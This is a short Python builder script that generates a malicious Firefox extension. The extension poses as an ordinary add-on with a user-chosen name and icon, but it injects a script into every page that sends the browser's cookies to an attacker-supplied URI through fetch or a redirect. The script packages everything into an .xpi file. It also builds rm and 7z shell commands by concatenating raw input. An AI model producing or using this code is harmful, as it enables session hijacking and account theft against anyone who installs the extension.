#!/bin/env python3
#shiky8
import os
add_name = input("Enter the ADD Name : ")
add_description =  input("Enter the ADD description : ")
add_icon = input("Enter the ADD icon : ")
AttackerURI = input("Enter the Attacker URI : ")
os.system('rm src/js/main.js manifest.json output/'+add_name+'.xpi')
manifest = '''{
  "manifest_version": 2,
  "name": "'''+add_name+'''",
  "version": "1.0.0",

  "description": "'''+add_description+'''",

  "icons": {
    "48": "'''+add_icon+'''"
  },

  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["src/js/main.js"]
    }
  ]
}
'''

# print(manifest)
ManifestFile = open('manifest.json','w')
ManifestFile.write(manifest)
ManifestFile.close()
backend = '''popisHere = sessionStorage.getItem("popisHere"); 
if(popisHere){
console.log("same");
}else{
	sessionStorage.setItem("popisHere", true);
	fetch("'''+AttackerURI+'''/c.php?c="+escape(document.cookie))
	  .then(response => {
	    if (response.ok) {
	      console.log('Website loaded successfully');
	    } else {
	      location.href="'''+AttackerURI+'''/c.php?c="+escape(document.cookie);
	      // Add your series of steps here for handling the error
	    }
	  })
	  .catch(error => {
	    location.href="'''+AttackerURI+'''/c.php?c="+escape(document.cookie);
	    // Add your series of steps here for handling the error
	  });
}

'''
# print(backend)
BackendFile = open('src/js/main.js','w')
BackendFile.write(backend)
BackendFile.close()
os.system('7z a -tzip -mx9 output/'+add_name+'.xpi manifest.json src/js/main.js  '+add_icon)
print("done check output/"+add_name+".xpi")